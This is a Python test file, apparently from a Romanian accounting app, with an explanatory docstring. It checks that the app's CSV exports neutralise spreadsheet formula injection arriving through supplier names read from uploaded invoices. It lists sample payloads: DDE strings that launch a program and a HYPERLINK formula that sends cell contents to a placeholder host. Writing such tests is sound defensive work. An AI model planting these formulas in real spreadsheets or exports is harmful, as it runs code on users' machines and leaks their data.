"""Un fișier care iese din aplicație nu are voie să execute nimic la deschidere.

**De unde vine riscul.** Toate exporturile — registrul lunii, onorariile,
raportul, modelul de import — sunt CSV-uri făcute anume ca să se deschidă în
Excel. Excel, ca și LibreOffice, tratează o celulă care începe cu `=`, `+`, `-`
sau `@` drept **formulă**, nu drept text. Iar formulele nu se opresc la
aritmetică: `=cmd|'/c calc'!A1` cere pornirea unui program, iar
`=HYPERLINK("http://…"&A1)` scoate conținutul celulei vecine pe internet la o
apăsare.

**De ce este cazul acestei aplicații, nu unul teoretic.** Textul din registru nu
este scris de cabinet. `Furnizor` vine din citirea unui document **trimis de
client** — adică din afara cabinetului, de la oricine are linkul de încărcare.
Cine trimite o factură alege ce scrie în ea. Drumul este complet: document
ostil → extracție → registru → fișier → Excelul contabilului.

`csv.writer` nu apără de asta și nici nu pretinde: el rezolvă separatorii și
ghilimelele din interiorul valorii, adică integritatea **coloanelor**. Ce se
întâmplă cu valoarea după ce Excel o citește este altă întrebare.

**De ce în `render`, și nu la fiecare export.** Sunt patru exporturi și vor fi
mai multe. O regulă aplicată la fiecare capăt se respectă pe primele trei și se
uită la al patrulea — chiar `excel_csv.py` scrie asta despre separator și BOM.
Aici trece tot ce iese, deci aici stă regula.

**Ce nu are voie să strice reparația.** `-1234,56` începe cu `-` și este exact
numărul pe care contabilul îl adună într-o coloană. Un apostrof pus în fața lui
l-ar transforma în text, iar totalul ar ieși zero — adică fix paguba pe care
`excel_csv.py` o descrie ca fiind cea mai perfidă. Numerele și datele noastre
trec neatinse.
"""

from __future__ import annotations

from datetime import date
from decimal import Decimal

import pytest

from app.domain.enums import DocumentStatus
from app.services import document_register, excel_csv, fee_register
from app.services.document_register import RegisterRow
from app.services.fees import FeeRow

#: Prefixele pe care Excel le citește ca început de formulă. Tab și retur de car
#: sunt aici pentru că Excel le sare și se uită la caracterul următor.
FORMULA_STARTS = ("=", "+", "@", "\t", "\r")

#: Sarcini reale, nu `=1+1`: prima cere pornirea unui program, a doua scoate date
#: pe internet fără macrouri, doar din formula standard.
PAYLOADS = (
    "=cmd|'/c calc'!A1",
    '=HYPERLINK("http://exemplu.invalid/"&A2,"Deschide")',
    "@SUM(1+1)*cmd|'/c calc'!A1",
)


def first_cell(text: str) -> str:
    """Prima celulă a primului rând, fără BOM și fără ghilimelele de scăpare."""
    line = text.removeprefix(excel_csv.BOM).split(excel_csv.LINE_ENDING)[0]
    cell = line.split(excel_csv.DELIMITER)[0]
    if cell.startswith('"') and cell.endswith('"'):
        cell = cell[1:-1].replace('""', '"')
    return cell


class TestFormulaInjection:
    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_a_cell_does_not_reach_excel_as_a_formula(self, payload: str) -> None:
        """Ce a scris cineva în numele unui furnizor rămâne text."""
        cell = first_cell(excel_csv.render([[payload]]))

        assert not cell.startswith(FORMULA_STARTS), cell
        # Textul nu se pierde: cine citește fișierul trebuie să vadă ce scria
        # acolo, ca să înțeleagă de ce documentul arată așa.
        assert payload in cell

    @pytest.mark.parametrize("start", FORMULA_STARTS)
    def test_every_leading_character_that_excel_reads_as_a_formula(self, start: str) -> None:
        """Nu doar `=`. Excel începe formula și de la `+`, `@`, tab sau retur."""
        cell = first_cell(excel_csv.render([[f"{start}SUM(A1:A9)"]]))

        assert not cell.startswith(FORMULA_STARTS), repr(cell)

    def test_the_register_carries_a_supplier_read_from_a_document(self) -> None:
        """Drumul întreg, nu doar funcția: document ostil → registru → fișier."""
        row = RegisterRow(
            client_name="Alfa Conta SRL",
            client_tax_id="RO123",
            document_date=date(2026, 8, 3),
            reference_month="2026-08",
            type_label="Factură",
            series="FCT",
            document_number="118",
            supplier_name=PAYLOADS[0],
            supplier_tax_id=None,
            customer_name=None,
            customer_tax_id=None,
            currency="RON",
            subtotal=Decimal("1000.00"),
            vat_amount=Decimal("190.00"),
            total_amount=Decimal("1190.00"),
            status=DocumentStatus.APPROVED,
            original_filename="factura.pdf",
        )

        text = document_register.to_csv([row])
        supplier = text.split(excel_csv.LINE_ENDING)[1].split(excel_csv.DELIMITER)[7]

        assert not supplier.strip('"').startswith(FORMULA_STARTS), supplier

    def test_the_fee_note_written_by_a_colleague(self) -> None:
        """Și textul scris în cabinet: o observație lipită dintr-un email."""
        import uuid

        entry = FeeRow(
            client_id=uuid.uuid4(),
            client_name="Beta SRL",
            period="2026-08",
            configured=Decimal("500.00"),
            currency="RON",
            amount=Decimal("500.00"),
            paid_on=None,
            paid_by_name=None,
            note=PAYLOADS[1],
        )

        text = fee_register.to_csv([entry], {})
        note = text.split(excel_csv.LINE_ENDING)[1].split(excel_csv.DELIMITER)[-1]

        assert not note.strip('"').startswith(FORMULA_STARTS), note


class TestWhatMustNotBreak:
    """Reparația nu are voie să strice fișierul pentru care există exportul."""

    def test_a_negative_amount_is_still_a_number(self) -> None:
        """`-1234,56` începe cu `-` și trebuie să rămână un număr adunabil.

        Un apostrof în fața lui l-ar face text, iar coloana s-ar aduna la zero —
        exact paguba pe care `excel_csv.py` o numește cea mai perfidă.
        """
        rendered = excel_csv.number(Decimal("-1234.56"))
        assert rendered == "-1234,56"

        cell = first_cell(excel_csv.render([[rendered]]))
        assert cell == "-1234,56"

    def test_a_date_stays_a_date(self) -> None:
        cell = first_cell(excel_csv.render([[excel_csv.day(date(2026, 8, 31))]]))
        assert cell == "31.08.2026"

    def test_ordinary_text_is_not_touched(self) -> None:
        """Un nume de client obișnuit iese identic. Inclusiv cu cratimă la mijloc."""
        for value in ("Alfa Conta SRL", "Șerbănescu & Fiii", "Gama-Distribuție SRL", ""):
            assert first_cell(excel_csv.render([[value]])) == value

    def test_the_separator_inside_a_value_still_does_not_break_columns(self) -> None:
        """Regula veche rămâne: un `;` în denumire nu rupe coloanele."""
        text = excel_csv.render([["Alfa; Beta SRL", "a doua"]])
        line = text.removeprefix(excel_csv.BOM).split(excel_csv.LINE_ENDING)[0]

        assert line == '"Alfa; Beta SRL";a doua'
